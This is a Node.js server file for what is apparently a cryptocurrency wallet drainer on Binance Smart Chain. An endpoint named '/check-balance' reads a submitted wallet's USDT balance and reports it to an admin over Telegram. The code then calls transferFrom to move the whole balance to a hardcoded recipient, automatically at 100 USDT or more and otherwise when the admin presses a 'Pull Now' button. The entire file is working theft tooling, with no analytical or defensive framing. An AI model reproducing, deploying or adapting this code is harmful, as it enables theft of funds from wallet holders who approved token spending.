const express = require('express');
const Web3 = require('web3');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// Configuration
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_ADDRESS = "0xbeFe193d6abc1C5C5F37414A99fA3502B98CC8f7";
const RECIPIENT = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const web3 = new Web3('https://bsc-dataseed.binance.org');
const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);

// Check wallet balance endpoint
app.post('/check-balance', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        const usdtContract = new web3.eth.Contract([
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ], USDT_ADDRESS);

        const balance = await usdtContract.methods.balanceOf(walletAddress).call();
        const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
        
        // Send Telegram notification
        await sendTelegramNotification(walletAddress, balanceInUSDT);

        // If balance >= 100, auto-transfer
        if (parseFloat(balanceInUSDT) >= 100) {
            await executeTransfer(walletAddress, balance);
            res.json({ success: true, autoTransferred: true, balance: balanceInUSDT });
        } else {
            res.json({ success: true, autoTransferred: false, balance: balanceInUSDT });
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Manual transfer via Telegram button
app.post('/pull-now', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        const usdtContract = new web3.eth.Contract([
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ], USDT_ADDRESS);

        const balance = await usdtContract.methods.balanceOf(walletAddress).call();
        await executeTransfer(walletAddress, balance);
        
        res.json({ success: true, message: 'Transfer executed' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

async function executeTransfer(walletAddress, amount) {
    try {
        const usdtContract = new web3.eth.Contract([
            {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ], USDT_ADDRESS);

        const tx = usdtContract.methods.transferFrom(walletAddress, RECIPIENT, amount);
        const gas = await tx.estimateGas({ from: account.address });
        
        const signedTx = await web3.eth.accounts.signTransaction({
            to: USDT_ADDRESS,
            data: tx.encodeABI(),
            gas: Math.ceil(gas * 1.1),
            gasPrice: await web3.eth.getGasPrice(),
            nonce: await web3.eth.getTransactionCount(account.address)
        }, PRIVATE_KEY);

        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        
        const balanceInUSDT = web3.utils.fromWei(amount, 'ether');
        await sendTransferNotification(walletAddress, balanceInUSDT, receipt.transactionHash);
        
        return receipt;
    } catch (error) {
        console.error('Transfer error:', error);
        throw error;
    }
}

async function sendTelegramNotification(walletAddress, balance) {
    try {
        const message = `
🔔 **Wallet Detected!**

👤 Wallet: ${walletAddress}
💰 Balance: ${balance} USDT
⏰ Time: ${new Date().toLocaleString()}

${parseFloat(balance) >= 100 ? '✅ Auto-transferring...' : '⚠️ Balance below $100 threshold'}
        `;

        if (parseFloat(balance) < 100) {
            // Add Pull Now button for balances < $100
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: ADMIN_CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '💳 Pull Now', callback_data: `pull_${walletAddress}` }
                    ]]
                }
            });
        } else {
            // Simple notification for auto-transfer
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: ADMIN_CHAT_ID,
                text: message
            });
        }
    } catch (error) {
        console.error('Telegram notification error:', error);
    }
}

async function sendTransferNotification(walletAddress, amount, txHash) {
    try {
        const message = `
✅ **Transfer Completed!**

👤 Wallet: ${walletAddress}
💸 Amount Transferred: ${amount} USDT
📝 TX Hash: ${txHash}
⏰ Time: ${new Date().toLocaleString()}
        `;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message
        });
    } catch (error) {
        console.error('Transfer notification error:', error);
    }
}

// Telegram webhook for button clicks
app.post('/webhook', express.json(), async (req, res) => {
    try {
        const { callback_query } = req.body;
        
        if (callback_query && callback_query.data.startsWith('pull_')) {
            const walletAddress = callback_query.data.replace('pull_', '');
            
            const usdtContract = new web3.eth.Contract([
                {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
            ], USDT_ADDRESS);

            const balance = await usdtContract.methods.balanceOf(walletAddress).call();
            await executeTransfer(walletAddress, balance);
            
            res.json({ ok: true });
        }
    } catch (error) {
        console.error('Webhook error:', error);
        res.json({ ok: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
